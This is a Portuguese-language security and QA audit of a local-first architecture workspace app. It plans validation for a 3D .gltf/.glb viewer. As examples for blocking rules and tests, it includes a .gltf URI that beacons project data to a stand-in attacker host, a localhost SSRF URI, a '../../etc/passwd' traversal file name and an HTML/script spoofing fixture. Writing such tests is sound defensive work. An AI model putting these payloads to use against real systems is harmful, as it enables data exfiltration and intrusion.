# Auditoria Independente de Segurança, Privacidade e Quality Assurance — Fase 04

- **Agente Responsável:** Agente D (Security, Privacy & Quality Assurance)
- **Data da Auditoria:** 2026-11-14
- **Branch de Auditoria:** `codex/f04-security-qa`
- **Branch Base Auditada:** `codex/f02-integration-preview`
- **Referência Git (Commit Base):** `b91b056ddcb278234e2378f595bc4255f3ee77d0`
- **Âmbito:** Auditoria das garantias técnicas da aplicação actual (Fases 01–03 integradas) e preparação do plano independente de validação de segurança, privacidade, resiliência e acessibilidade para o Visualizador 3D Web (`.glb`/`.gltf`) e registo de modelos nativos (`.skp`) da Fase 04.

---

## 1. Sumário Executivo

A inspecção estática e comportamental da referência `b91b056ddcb278234e2378f595bc4255f3ee77d0` confirma que o **O+A Workspace** cumpre os invariantes fundamentais de **ausência de palavras-passe**, **inexistência de dados pessoais ou credenciais reais**, **isolamento em `localStorage` com reposição global determinística** e **privacidade por omissão (`publicationStatus = 'private'`)** nos projectos criados localmente. A comunicação da interface representa com transparência que a selecção de papéis constitui apenas uma calibração de perspectiva de interface e nunca autenticação ou controlo de acessos real.

Contudo, a transição para a **Fase 04 (Visualizador 3D `.glb`/`.gltf` e gestão de ficheiros `.skp` em `/workspace/projects/:id/model` e no Dossier)** introduz uma nova superfície de ataque e de estabilidade no cliente: processamento binário/JSON de ficheiros locais no navegador, alocação de memória RAM/VRAM via `Blob`/`ObjectURL` e WebGL, potenciais referências externas em ficheiros `.gltf`, falhas de contexto gráfico (`webglcontextlost`) e requisitos estritos de acessibilidade por teclado sobre elementos `<canvas>`. Adicionalmente, foram identificados pontos de endurecimento necessários no código actual (como limites de tamanho de campos e colecções em `localStorage`, validação mais estrita de nomes/extensões em `addProjectFileReference` e pequenas divergências de texto informativo após a Fase 03).

---

## 2. Análise Técnica dos 10 Domínios Obrigatórios

### 2.1. Utilização de `localStorage` e Separação de Dados Demonstrativos

- **Inventário de Chaves Confirmado (6 chaves exclusivas com prefixo `oa_workspace_`):**
  1. `oa_workspace_demo_session_v1` (`src/data/sessionRepository.ts`): guarda apenas `{ userId, role, authenticatedAt, mode: 'local-demo' }`.
  2. `oa_workspace_user_prefs_v1` (`src/data/sessionRepository.ts`): guarda `{ language, reduceMotionOverride }`.
  3. `oa_workspace_demo_notifications_v1` (`src/features/workspace-shell/shellDemoState.ts`): guarda apenas o array `{ readIds: string[] }` filtrado contra IDs válidos.
  4. `oa_workspace_shell_rail_v1` (`src/features/workspace-shell/shellDemoState.ts`): guarda apenas `{ collapsed: boolean }`.
  5. `oa_workspace_studio_desk_v1` (`src/data/studioDeskFixtures.ts`): guarda `{ scope, viewMode, taskStatuses, dismissedActivityNotice }`.
  6. `oa_workspace_project_library_v1` (`src/data/projectLibraryRepository.ts`): guarda o envelope `{ schemaVersion: 1, updatedAt, seedOverrides, createdRecords }`.
- **Sanitização na Leitura e Reposição:**
  - Todos os repositórios envolvem `window.localStorage` em blocos `try/catch` e validam a estrutura JSON lida. Caso o registo esteja corrompido ou fora do esquema esperado, a chave é removida ou reposta para os valores iniciais (`resetProjectLibraryStore`, `loadDemoSession`, `readPersistedStudioDeskState`).
  - A acção `resetAllDemoData()` em `src/app/WorkspaceSessionContext.tsx` limpa todas as 6 chaves e reinicia o estado em memória sem resíduos.
- **Risco Identificado para a Fase 04:**
  - O armazenamento `localStorage` dos navegadores tem um limite rígido (~5 MB por origem). **Sob nenhuma circunstância a Fase 04 deve serializar payloads binários `.glb`, `.gltf` ou `.skp` (ex.: em Base64 / Data URLs) dentro de `oa_workspace_project_library_v1`.** Apenas metadados leves da referência do ficheiro e estado de sessão devem ser guardados, mantendo os bytes do modelo em memória (`Blob` / `ArrayBuffer`) ou armazenamento efémero controlado.

### 2.2. Ausência de Credenciais e Dados Privados Reais

- **Verificação do Código e Configuração:**
  - Não existem ficheiros `.env`, chaves de API, tokens, segredos, clientes HTTP (`fetch`/`axios` para servidores externos) nem telemetria oculta.
  - Em `src/data/fixtures.ts`, os 6 perfis (`DEMO_USERS`) têm explícito o sufixo `(Demo)` no nome, utilizam o domínio reservado `.demo@oa-workspace.local` (RFC 6761) e definem `isDemoAccount: true`.
  - A chave de acesso demonstrativa (`demoAccessKey: 'oa-demo'`) existe apenas em memória durante a validação opcional no ecrã `/login` e **nunca é escrita em `localStorage`** (`src/data/sessionRepository.ts`, linhas 17–24 e 86–91).
  - Os 5 projectos de referência (`OA-26-014`, `OA-26-019`, `OA-25-088`, `OA-26-022`, `OA-26-007`) contêm exclusivamente dados arquitectónicos fictícios.
  - `index.html` inclui `<meta name="robots" content="noindex, nofollow" />`.

### 2.3. Validação de Metadados e Ficheiros Locais

- **Estado Actual (`src/data/projectLibraryRepository.ts`):**
  - `createProject` e `updateProjectMetadata` validam campos obrigatórios mínimos (ex.: `title.pt >= 3` caracteres, `summary.pt >= 10` caracteres, formato de data `YYYY-MM-DD`, unicidade de `code` e `id`).
  - `deriveFileMeta(fileName, kind)` (linhas 637–699) extrai a extensão por expressão regular `/\.([a-z0-9]{2,5})$/i` e classifica `.skp`, `.glb` e `.gltf` com as capacidades declaradas:
    - `.skp` → `formatCategory: 'source-cad-3d'`, `webRenderableInPhase04: false`, `isNativeSourceModel: true`.
    - `.glb` / `.gltf` → `formatCategory: 'web-3d-mesh'`, `webRenderableInPhase04: true`, `isNativeSourceModel: false`.
- **Lacunas Confirmadas na Validação Actual:**
  - **Falta de validação estrita do nome e extensão em `addProjectFileReference` (linhas 1198–1267):** A função aceita qualquer string não vazia em `input.fileName`, permitindo sequências de caminho (`../../etc/passwd`), URLs (`https://...`), caracteres de controlo ou extensões que contradizem o `kind` seleccionado (ex.: registar `malware.exe` com `kind: 'glb'`, pois `deriveFileMeta` aceita a extensão `.exe` e usa os valores por omissão do `kind`).
  - **Ausência de limites máximos de comprimento (`maxLength`):** Campos de texto (`titlePt`, `summaryPt`, `dossierNotesPt`, `fileName`, `versionLabel`, `code`) não impõem limite superior no repositório nem nos formulários (`ProjectCreationWizard.tsx`, `ProjectDossierView.tsx`).

### 2.4. Limites de Tamanho e Consumo de Memória

- **Estado Actual:**
  - Na Fase 03, o registo de ficheiros (`addProjectFileReference`) guarda apenas o nome textual do ficheiro (`fileName`) sem ler um objecto `File` do sistema operativo e sem validar `file.size`.
  - Não existe limite máximo para o número de entradas em `createdRecords`, `project.files` ou `project.revisions` em `oa_workspace_project_library_v1`.
- **Requisitos Críticos para o Visualizador 3D da Fase 04:**
  - Um ficheiro `.glb`/`.gltf` pequeno em disco (comprimido com Draco/Meshopt ou texturas PNG/JPEG/KTX2 de alta resolução) pode expandir-se para centenas de megabytes ou vários gigabytes em memória RAM e VRAM ao descomprimir malhas e texturas.
  - O carregador da Fase 04 tem de aplicar **limites explícitos de tamanho de ficheiro em bytes** antes da leitura em memória (ex.: aviso acima de `15 MB` e bloqueio rígido acima de `50 MB` em modo demonstrativo local) e rejeitar ficheiros com `file.size === 0`.

### 2.5. Riscos de Recursos Externos Referenciados por Ficheiros `.gltf`

- **Análise de Superfície de Ataque (P0 para Fase 04):**
  - Ao contrário do formato binário auto-contido `.glb`, um ficheiro `.gltf` é um documento JSON que referencia geometria binária e texturas através de propriedades `buffers[].uri` e `images[].uri`.
  - Se o motor 3D da Fase 04 passar um ficheiro `.gltf` directamente para um `GLTFLoader` padrão sem inspecção prévia dos `uri`:
    1. **Exfiltração de Privacidade / Tracking Pixel / SSRF no Cliente:** Um `.gltf` malicioso pode conter `"uri": "https://attacker.example/beacon?project=..."` ou `"uri": "http://127.0.0.1:8080/..."`, fazendo o navegador realizar pedidos de rede silenciosos assim que o utilizador abre o modelo.
    2. **Quebra do Invariante 100% Local-First:** O workspace deixaria de ser estritamente local e offline-safe.
    3. **Path Traversal Relativo:** Referências relativas (`"uri": "../secret.bin"`) falham ou tentam resolver caminhos relativos à rota da aplicação (`/workspace/projects/...`).
- **Controlo Obrigatório na Fase 04:**
  - Antes de entregar um `.gltf` ao parser WebGL/Three.js, o validador deve fazer parse do JSON e **inspeccionar todos os campos `buffers[].uri`, `images[].uri` e extensões glTF**:
    - Permitir apenas URIs `data:` embutidos (`data:application/octet-stream;base64,...`, `data:image/png;base64,...`, `data:image/jpeg;base64,...`, `data:image/webp;base64,...`) ou buffers resolvidos a partir de ficheiros locais explicitamente seleccionados na mesma operação;
    - **Bloquear imediatamente** qualquer URI com esquema `http:`, `https:`, `ws:`, `wss:`, `file:`, `javascript:`, `data:text/html`, `data:image/svg+xml` (risco de XSS/XXE em SVG) ou caminhos relativos/protocol-relative (`//`, `/`, `./`, `../`).

### 2.6. Utilização Segura e Revogação de `Blob` / `ObjectURLs`

- **Estado Actual:**
  - Na referência `b91b056`, ainda não existem chamadas a `URL.createObjectURL` ou `URL.revokeObjectURL`.
- **Riscos e Garantias Exigidas na Fase 04:**
  - Sempre que `URL.createObjectURL(fileOrBlob)` é invocado para alimentar o visualizador 3D, o navegador retém o `Blob` em memória até que `URL.revokeObjectURL(objectUrl)` seja explicitamente chamado ou a aba seja fechada.
  - **Proibição de Persistência de `blob:` URLs:** Um endereço `blob:http://...` expira assim que o documento é recarregado (`F5`). Guardar um `blob:` URL em `oa_workspace_project_library_v1` (`localStorage`) produzirá erros de carregamento na sessão seguinte.
  - **Revogação Determinística:** A substituição de um modelo por outro, a limpeza do modelo activo, a mudança de projecto ou a desmontagem (`unmount`) do componente do visualizador têm de executar:
    1. `URL.revokeObjectURL(previousObjectUrl)`;
    2. Libertação explícita de recursos WebGL/Three.js (`geometry.dispose()`, `material.dispose()`, `texture.dispose()`, `renderer.dispose()`).

### 2.7. Tratamento de Modelos Inválidos, Corrompidos ou Malformados

- **Cenários de Falha que a Fase 04 Deve Tratar sem Quebrar a Aplicação:**
  - **Spoofing de extensão:** Ficheiro `.txt`, `.html`, `.exe` ou `.skp` renomeado para `.glb` ou `.gltf`.
  - **Cabeçalho binário `.glb` inválido:** Um ficheiro `.glb` válido (especificação glTF 2.0) começa obrigatoriamente por um cabeçalho de 12 bytes:
    - Bytes `0..3`: Magic `0x46546C67` (ASCII `"glTF"` em little-endian);
    - Bytes `4..7`: Versão `2` (`uint32` little-endian);
    - Bytes `8..11`: Comprimento total em bytes (`uint32` little-endian), que deve coincidir exactamente com `file.size` e ser `>= 20` bytes (cabeçalho de 12 bytes + cabeçalho do primeiro chunk JSON de 8 bytes `0x4E4F534A`).
  - **Ficheiro `.glb` truncado/incompleto:** Cabeçalho declara `length = 500000`, mas o ficheiro tem apenas `12000` bytes.
  - **Ficheiro `.gltf` malformado:** JSON truncado, não-objecto, sem `asset.version` compatível com `"2.0"`, ou versão legada `"1.0"`.
  - **Modelo `.skp` (SketchUp):** Deve ser reconhecido como ficheiro de trabalho nativo legítimo para registo documental no dossier, mas **rejeitado com mensagem pedagógica clara** se o utilizador tentar abri-lo como malha 3D renderizável no navegador.

### 2.8. Tratamento de Erros e Falhas do Navegador

- **Estado Actual:**
  - Os acessos a `localStorage` estão protegidos contra `SecurityError` / `QuotaExceededError` na leitura, embora `writeStore()` em `projectLibraryRepository.ts` (linhas 546–553) ignore silenciosamente excepções de escrita (`catch { // Ignore storage quota or private mode errors }`) sem devolver aviso à UI se a gravação em `localStorage` falhar após actualizar a cache em memória.
  - Não existe ainda uma *React Error Boundary* dedicada em torno das vistas de projecto ou da futura área de renderização 3D.
- **Requisitos para a Fase 04:**
  - **Error Boundary Isolada no Visualizador 3D:** Qualquer excepção síncrona ou assíncrona durante o parse/renderização no `<canvas>` deve ser capturada localmente, mantendo intactos a `WorkspaceShell`, o cabeçalho, a pesquisa global e a navegação de retorno ao dossier.
  - **Gestão de Falha de WebGL e `webglcontextlost`:** Se `WebGLRenderingContext` / `WebGL2RenderingContext` não estiver disponível (ex.: aceleração por hardware desactivada, ambiente headless ou bloqueio de GPU) ou se o evento `webglcontextlost` disparar durante a inspecção de um modelo pesado, o visualizador deve chamar `event.preventDefault()`, interromper o ciclo de animação (`requestAnimationFrame`) e apresentar um estado de fallback editorial com opção de recarregar o modelo ou voltar ao dossier.

### 2.9. Acessibilidade WCAG 2.2 AA e Navegação por Teclado

- **Garantias Confirmadas na Aplicação Actual:**
  - *Skip link* funcional em `WorkspaceShell.tsx` (`#workspace-main-content`).
  - Gestão de foco em mudança de rota (`mainRef.current?.focus()` em `WorkspaceShell.tsx`, linhas 59–61).
  - *Focus trap*, fecho com `Escape` e restauro de foco ao elemento de origem nos diálogos modais (`GlobalSearchDialog`, `ProjectCreationWizard`, `ProjectDossierDialog`).
  - Suporte completo a movimento reduzido (`prefers-reduced-motion: reduce` + preferência manual `reduceMotionOverride` em `/workspace/settings` aplicada via atributo `data-reduce-motion` em `document.documentElement`).
- **Pontos de Atenção actuais e para a Fase 04:**
  - **Acessibilidade do `<canvas>` 3D (Fase 04 — P1):** Um controlo de órbita 3D apenas por rato/toque viola a WCAG 2.2 AA (Critérios 2.1.1 *Keyboard*, 2.1.2 *No Keyboard Trap*, 4.1.2 *Name, Role, Value*). O visualizador 3D tem de:
    1. Evitar armadilhas de teclado (`Tab` e `Shift+Tab` têm de entrar e sair livremente da área do visualizador);
    2. Fornecer controlos acessíveis por teclado (botões ou atalhos documentados para *Reset Camera*, vistas ortogonais/predefinidas *Frente / Topo / Axonometria*, *Zoom In / Out* e *Orbit*);
    3. Respeitar `prefers-reduced-motion` / `reduceMotionOverride` desactivando qualquer rotação automática de câmara (*auto-rotate*) ou transições bruscas;
    4. Anunciar estados de carregamento, sucesso e erro através de regiões `role="status"` / `aria-live="polite"` e `role="alert"`.
  - **Observações Menores na Fase 03 (`ProjectDossierView.tsx`):**
    - A abertura dos formulários inline de edição de metadados, adição de ficheiro e nova revisão não move automaticamente o foco para o primeiro campo do formulário.
    - No formulário de revisão (`#rev-meta-summary`), falta associar `aria-invalid` e `aria-describedby` à mensagem de erro quando a validação falha.

### 2.10. Integridade das Rotas, Identificação dos Projectos e Estados Privados

- **Privacidade por Omissão (`publicationStatus = 'private'`):**
  - **Confirmado e Blindado:** Em `src/data/projectLibraryRepository.ts`, `createProject()` (linhas 926–928) força `publicationStatus: 'private'`. Além disso, `validateCanonicalRecord()` (linhas 384–387) impõe `const safePublicationStatus = metadata.origin === 'local-created' ? 'private' : publication.publicationStatus`, impedindo que a adulteração manual de `localStorage` promova um projecto criado localmente para um estado publicado.
- **Autenticação Demonstrativa vs. Autorização Real:**
  - **Confirmado:** As rotas `/welcome` e `/workspace/*` são protegidas por `RequireDemoSession` (`src/app/App.tsx`, linhas 35–44), que redirecciona para `/login` se não existir sessão demonstrativa.
  - A troca de papel no topo da aplicação (`WorkspaceHeader.tsx`) e em `/workspace/settings` altera imediatamente a perspectiva funcional sem pedir credenciais e exibe avisos claros de que **não constitui controlo de acessos ou segurança real**.
- **Resolução de Projectos e Rotas (`/workspace/projects/:id` e `/workspace/projects/:id/model`):**
  - `getProjectById(idOrCode)` (`projectLibraryRepository.ts`, linhas 615–631) resolve projectos por `identity.id`, `identity.code` ou `identity.slug` (insensível a maiúsculas/minúsculas).
  - Na referência `b91b056`, a rota `/workspace/projects/:id/model` está reservada em `src/app/App.tsx` (linha 91) e apresenta `PlannedModuleView`. Quando um projecto não existe em `/workspace/projects/:id`, `ProjectDossierView.tsx` (linhas 546–592) apresenta um estado explícito de projecto não encontrado com retorno seguro à biblioteca.
  - **Nuance Identificada em `slug`:** Em `updateProjectMetadata` (linha 1015), editar `title.pt` recalcula `identity.slug`. Como as ligações internas usam `identity.id` (imutável), a navegação interna não quebra, mas URLs externos guardados por `slug` deixam de resolver se o título português mudar. Recomenda-se usar sempre `identity.id` (ou `identity.code`) nas rotas de `/workspace/projects/:id/model`.

---

## 3. Vulnerabilidades, Riscos Confirmados e Riscos Ainda Não Verificáveis

### 3.1. Vulnerabilidades e Riscos Confirmados na Base Actual (`b91b056`)

| ID | Prioridade | Categoria | Descrição e Localização Exacta | Impacto | Recomendação Técnica |
| :--- | :---: | :--- | :--- | :--- | :--- |
| **SEC-F04-01** | **P1** | Validação de Ficheiros e Metadados | Em `src/data/projectLibraryRepository.ts` (`addProjectFileReference`, L1198–1267; `deriveFileMeta`, L637–699), `fileName` aceita qualquer texto sem sanitização de caminhos (`../`, `\`, `:`), URLs ou caracteres de controlo, e permite registar ficheiros cuja extensão contradiz o `kind` declarado (ex.: `script.html` com `kind: 'glb'`). | Inconsistência de metadados no dossier, confusão na elegibilidade para o Visualizador 3D da Fase 04 e risco de injecção de nomes de ficheiro enganadores. | Extrair apenas o *basename* seguro do ficheiro, rejeitar caracteres de controlo/separadores de directório e validar que a extensão do ficheiro corresponde estritamente ao `kind` seleccionado (`.skp`, `.glb`, `.gltf`, `.pdf`, `.dwg`, `.ifc`, `.png`, `.jpg`, `.jpeg`, `.webp`). |
| **SEC-F04-02** | **P1** | Quota de `localStorage` e Limites de Input | Em `src/data/projectLibraryRepository.ts` e nos formulários `ProjectCreationWizard.tsx` / `ProjectDossierView.tsx`, não existem limites máximos (`maxLength`) para títulos, resumos, notas ou nomes de ficheiro, nem limite para o número de projectos/ficheiros/revisões. Adicionalmente, `writeStore()` (L546–553) silencia `QuotaExceededError` após mutar a cache em memória (`memoryCache = store`), criando divergência silenciosa entre a sessão actual e o que fica realmente persistido. | Exaustão da quota de 5 MB do `localStorage`, falha silenciosa de persistência após recarregar a página e degradação de desempenho da UI com strings gigantes. | Definir limites máximos explícitos no repositório e nos inputs HTML (`title <= 140`, `summary <= 600`, `dossierNotes <= 4000`, `fileName <= 180`, `versionLabel <= 24`, máx. ficheiros/revisões por projecto) e propagar erro explícito se `localStorage.setItem` lançar `QuotaExceededError`. |
| **QA-F04-03** | **P2** | Coerência de dados entre Studio Desk e Project Library | `src/features/studio-desk/StudioDeskPage.tsx` (L218, L308, L447, L493) consome a constante estática `STUDIO_DESK_PROJECTS` em vez de `useProjectLibrary()` / `listStudioDeskCompatibleProjects()`. Projectos criados localmente ou editados em `/workspace/projects` aparecem na Pesquisa Global (`globalSearchIndex.ts`), mas não surgem na tabela do Studio Desk (`/workspace`), e `?project=<id-local>` mostra aviso de projecto não encontrado no Studio Desk. | Desfasamento entre a Biblioteca de Projectos (Fase 03) e a Mesa de Trabalho (Fase 02) para projectos criados localmente ou com metadados editados. | Documentar como limitação conhecida da vista Studio Desk ou alimentar `StudioDeskPage` através do adaptador `listStudioDeskCompatibleProjects()` do repositório canónico. |
| **QA-F04-04** | **P2** | Precisão das Mensagens Demonstrativas (PT/EN) | 1) Em `src/locales/pt.ts` (L236) e `src/locales/en.ts` (L236), `shell.settings.storageResetScopeNote` omite a Biblioteca de Projectos na descrição textual do que é limpo, embora a chave `oa_workspace_project_library_v1` esteja listada abaixo e seja efectivamente limpa por `resetAllDemoData()`.<br>2) Em `pt.ts` (L167) e `en.ts` (L168), `shell.search.emptyBody` refere ainda *"os 5 projectos do Studio Desk"*, apesar de a pesquisa indexar também os projectos criados localmente. | Pequena discrepância informativa face ao estado real da aplicação após a Fase 03. | Actualizar as duas strings em `pt.ts` e `en.ts` na revisão de integração para reflectir a inclusão da Biblioteca de Projectos. |
| **A11Y-F04-05** | **P2** | Acessibilidade de Formulários Inline e Hooks Duplicados | 1) Em `src/features/project-experience/ProjectDossierView.tsx`, abrir os formulários inline de edição de metadados, adição de ficheiro ou nova revisão não transfere o foco para o primeiro input, e `#rev-meta-summary` (L1679) não define `aria-invalid` / `aria-describedby`.<br>2) Existem dois hooks de *focus trap* duplicados (`src/design-system/useDialogFocusTrap.ts` e `src/features/studio-desk/useStudioDeskDialogFocusTrap.ts`). | Atrito na navegação exclusiva por teclado ao abrir formulários inline no dossier e duplicação de manutenção nos hooks de diálogo. | Focar o primeiro campo ao abrir cada formulário inline, associar `aria-invalid`/`aria-describedby` no input de revisão e consolidar o hook de *focus trap*. |

---

### 3.2. Riscos Ainda Não Verificáveis (Dependentes da Implementação dos Agentes A e B na Fase 04)

Estes riscos não existem no código base da Fase 03 porque o motor 3D e a interface do visualizador estão a ser desenvolvidos em paralelo pelos Agentes A e B. Constituem **alvos obrigatórios de verificação na revisão final de integração da Fase 04**:

| ID | Prioridade | Risco na Fase 04 (Agentes A e B) | Condição de Falha | Controlo Exigido para Aprovação |
| :--- | :---: | :--- | :--- | :--- |
| **V3D-F04-01** | **P0** | **Carregamento de Recursos Externos via `.gltf` (SSRF / Exfiltração / Tracking)** | Um ficheiro `.gltf` com `buffers[].uri` ou `images[].uri` apontando para `https://...`, `http://...`, `//...`, `file://...` ou `../` dispara pedidos de rede ao abrir o modelo. | Inspecção estrita do JSON `.gltf` antes do carregamento: bloquear qualquer URI externo ou caminho relativo; aceitar apenas `.glb` auto-contido ou `.gltf` com URIs `data:` seguros e validados. |
| **V3D-F04-02** | **P0** | **Persistência Indevida de Binários 3D ou `blob:` URLs em `localStorage`** | Guardar ficheiros `.glb`/`.gltf` em Base64 ou guardar `blob:http://...` dentro de `oa_workspace_project_library_v1`. | Binários e `ObjectURLs` têm de permanecer estritamente em memória de sessão; recarregar a página deve informar honestamente que o ficheiro local de sessão precisa de ser reaberto se não fizer parte das *seed fixtures* estáticas. |
| **V3D-F04-03** | **P0** | **Validação Binária Insuficiente (Magic Bytes / Spoofing / `.skp` no Parser WebGL)** | Validar apenas a extensão `.glb`/`.gltf` pelo nome do ficheiro sem verificar os primeiros bytes (`0x46546C67` `"glTF"`, versão `2`, comprimento total) ou tentar enviar um `.skp` para o motor WebGL. | Validação binária do cabeçalho de 12 bytes para `.glb`, validação de esquema JSON `asset.version === "2.0"` para `.gltf`, e tratamento diferenciado de `.skp` como registo de ficheiro-fonte nativo não renderizável no browser. |
| **V3D-F04-04** | **P0** | **Fuga de Memória (`ObjectURL` e Recursos GPU Three.js/WebGL)** | Substituir modelos repetidamente ou sair da rota `/workspace/projects/:id/model` sem chamar `URL.revokeObjectURL()` nem `dispose()` nas geometrias, materiais, texturas e `WebGLRenderer`. | Revogação determinística de `ObjectURL` e limpeza completa da cena/renderer em cada substituição de modelo, remoção ou desmontagem do componente. |
| **V3D-F04-05** | **P1** | **Bloqueio do Navegador por Modelos Gigantes ou Descompressão Excessiva** | Carregar um `.glb` de centenas de MB ou com milhões de polígonos sem limite de tamanho, congelando a *main thread* ou provocando *crash* da aba. | Limite máximo de tamanho de ficheiro imposto antes do parse (bloqueio rígido para ficheiros excessivos e aviso preventivo para modelos pesados) + indicadores claros de carregamento. |
| **V3D-F04-06** | **P1** | **Crash não capturado por Falha de WebGL ou `webglcontextlost`** | Ambientes sem WebGL2 ou perda de contexto gráfico lançam excepção não tratada e deixam o ecrã em branco. | *React Error Boundary* dedicada ao redor do visualizador + listener para `webglcontextlost` / verificação prévia de suporte WebGL com ecrã de contingência claro em PT/EN. |
| **V3D-F04-07** | **P1** | **Inacessibilidade por Teclado ou Violação de Movimento Reduzido no `<canvas>`** | O utilizador de teclado fica preso no `<canvas>` ou não consegue manipular/repor a câmara nem aceder às acções do modelo sem rato; rotação automática ignora `prefers-reduced-motion`. | Controlos de câmara operáveis por teclado (botões de vista/zoom/reset focáveis), ausência de *keyboard trap*, `aria-live` para estados do modelo e respeito integral por `reduceMotion`. |

---

## 4. Matriz de Prioridades (P0 / P1 / P2)

### Prioridade P0 — Bloqueadores de Integração (Impedem aprovação da Fase 04)
1. **Bloqueio total de URIs externos e caminhos relativos em ficheiros `.gltf`** (`V3D-F04-01`).
2. **Ausência absoluta de payloads binários 3D ou `blob:` URLs persistidos em `localStorage`** (`V3D-F04-02`).
3. **Validação real de cabeçalho binário `.glb` (magic `glTF`, versão 2, tamanho consistente), estrutura JSON `.gltf` 2.0 e separação honesta de `.skp`** (`V3D-F04-03`).
4. **Revogação comprovada de `URL.revokeObjectURL` e `dispose()` WebGL em substituição repetida de modelos e desmontagem de rota** (`V3D-F04-04`).
5. **Manutenção do invariante `publicationStatus = 'private'`** em todos os projectos e modelos locais, sem regressão de privacidade.

### Prioridade P1 — Alta Prioridade (Devem ser cumpridos antes do fecho da Fase 04)
1. **Limites de tamanho de ficheiro (`.glb`/`.gltf`) e protecção contra exaustão de memória** (`V3D-F04-05`).
2. **Error Boundary e tratamento gracioso de indisponibilidade/perda de WebGL (`webglcontextlost`)** (`V3D-F04-06`).
3. **Acessibilidade WCAG 2.2 AA do visualizador 3D por teclado e respeito por movimento reduzido** (`V3D-F04-07`).
4. **Sanitização de `fileName` e validação estrita de extensão vs. `kind` em `addProjectFileReference`** (`SEC-F04-01`).
5. **Limites máximos de caracteres nos campos persistidos em `localStorage` e tratamento de `QuotaExceededError`** (`SEC-F04-02`).

### Prioridade P2 — Melhorias de Qualidade e Consistência (Recomendadas para a integração da Fase 04)
1. **Alinhamento entre Studio Desk (`/workspace`) e Project Library (`/workspace/projects`)** (`QA-F04-03`).
2. **Actualização das strings PT/EN de âmbito de reposição e pesquisa vazia** (`QA-F04-04`).
3. **Gestão de foco ao abrir formulários inline no Dossier e consolidação do hook `useDialogFocusTrap`** (`A11Y-F04-05`).

---

## 5. Plano Independente de Validação e Quality Assurance — Fase 04

Este plano deve ser executado sobre a branch de integração da Fase 04 assim que os trabalhos dos Agentes A (motor/validação/contratos) e B (interface do visualizador/integração no dossier) forem reunidos. **Todos os testes devem utilizar exclusivamente ficheiros sintéticos e dados fictícios.**

### 5.1. Matriz de Casos de Teste de Segurança, Resiliência e Funcionalidade

| ID do Teste | Cenário de Validação | Fixture / Entrada Sintética (Sem Dados Reais) | Resultado Esperado |
| :--- | :--- | :--- | :--- |
| **QA-01** | **Modelo `.glb` válido (Caminho Feliz)** | Cubo/maqueta arquitectónica sintética mínima em `.glb` binário válido (glTF 2.0, `< 500 KB`, sem recursos externos). | O ficheiro é validado, renderizado no `<canvas>`, exibe metadados técnicos (formato, tamanho, estado de sessão), permite orbitar/zoom/repor vista e actualiza o estado local de forma honesta. |
| **QA-02** | **Modelo `.gltf` válido com `data:` URI embutido** | Ficheiro `.gltf` JSON válido (`asset.version: "2.0"`) cujo `buffers[0].uri` é `data:application/octet-stream;base64,...`. | O validador confirma que todos os URIs são `data:` seguros, carrega a geometria sem realizar pedidos de rede externos e renderiza o modelo. |
| **QA-03** | **Ficheiro `.skp` nativo (Registo vs. Renderização)** | Ficheiro `.skp` sintético registado ou seleccionado pelo utilizador. | Registado como **Fonte 3D Nativa (`.skp`)** no dossier. Se carregado no visualizador Web 3D, a UI explica claramente (em PT/EN) que `.skp` é um formato de autoria nativo e requer exportação para `.glb`/`.gltf` para inspecção interactiva no browser, sem lançar erro não tratado. |
| **QA-04** | **Modelo inválido / Spoofing de extensão** | Ficheiro de texto/HTML (`<html><script>alert(1)</script></html>`) renomeado para `pavilion.glb` e `pavilion.gltf`. | Rejeitado imediatamente na validação de cabeçalho binário (`magic !== 0x46546C67`) ou schema JSON. Nenhum script é executado; é exibida mensagem de erro clara e acessível (`role="alert"`). |
| **QA-05** | **Ficheiro `.glb` incompleto / truncado** | Ficheiro `.glb` cujo cabeçalho de 12 bytes declara `length = 2048`, mas o ficheiro foi truncado aos `64` bytes (ou chunk JSON cortado a meio). | Rejeitado por discrepância entre o `byteLength` real e o comprimento declarado no cabeçalho (ou erro de parse capturado), sem congelar a *thread* nem quebrar a página. |
| **QA-06** | **Ficheiro vazio (`0 bytes`)** | Ficheiro `empty.glb` ou `empty.gltf` com `size === 0`. | Rejeitado instantaneamente com mensagem específica de ficheiro vazio/inválido. |
| **QA-07** | **Tentativa de carregamento de recursos externos em `.gltf` (Segurança P0)** | Ficheiros `.gltf` contendo:<br>a) `"buffers": [{"uri": "https://example.com/leak.bin", "byteLength": 12}]`<br>b) `"images": [{"uri": "http://127.0.0.1:9000/track.png"}]`<br>c) `"buffers": [{"uri": "../secret.bin", "byteLength": 12}]`<br>d) `"images": [{"uri": "data:image/svg+xml;base64,..."}]` | **Todos bloqueados antes de qualquer `fetch` ou leitura pelo loader 3D.** O monitor de rede (`Network` / spy sobre `fetch`) confirma **zero pedidos externos**. A UI informa que ficheiros `.gltf` com referências externas não são permitidos por motivos de segurança e privacidade. |
| **QA-08** | **Modelo de grandes dimensões (Limites de Tamanho)** | Buffer sintético que excede o limite máximo definido (ex.: `> 50 MB`) e modelo no limiar de aviso (ex.: `20 MB`). | O ficheiro acima do limite máximo é recusado **antes** de alocar geometria WebGL, apresentando o limite suportado. O ficheiro intermédio apresenta aviso de desempenho mas mantém a UI responsiva. |
| **QA-09** | **Falha ou Perda de Contexto WebGL (`webglcontextlost`)** | 1) Simular `HTMLCanvasElement.prototype.getContext = () => null`.<br>2) Disparar `new Event('webglcontextlost')` no `<canvas>` com um modelo aberto. | A aplicação não sofre *crash*. O visualizador apresenta o painel de contingência editorial em PT/EN explicando a indisponibilidade/perda do contexto gráfico, mantendo a navegação para o Dossier e Biblioteca totalmente funcional. |
| **QA-10** | **Substituição repetida de modelos (Teste de Fuga de Memória / `ObjectURL`)** | Carregar e substituir sequencialmente 10 modelos `.glb` na mesma sessão e depois sair da rota `/workspace/projects/:id/model`. | `URL.revokeObjectURL` é chamado exactamente 1 vez por cada `URL.createObjectURL` anterior quando o modelo é substituído e quando o componente desmonta. Nenhuma referência `blob:` é guardada em `localStorage`. |
| **QA-11** | **Operações exclusivas por teclado (WCAG 2.2 AA)** | Navegar desde o topo da página com `Tab` / `Shift+Tab`, carregar um modelo, activar controlos de câmara (vistas/zoom/reset), alternar painéis técnicos e sair para o Dossier apenas com teclado. | Ordem de foco lógica, anel de foco visível (`focus-visible`), inexistência de *keyboard trap* no `<canvas>`, controlos de vista operáveis por `Enter`/`Space` ou teclas dedicadas, e fecho de diálogos com `Escape`. |
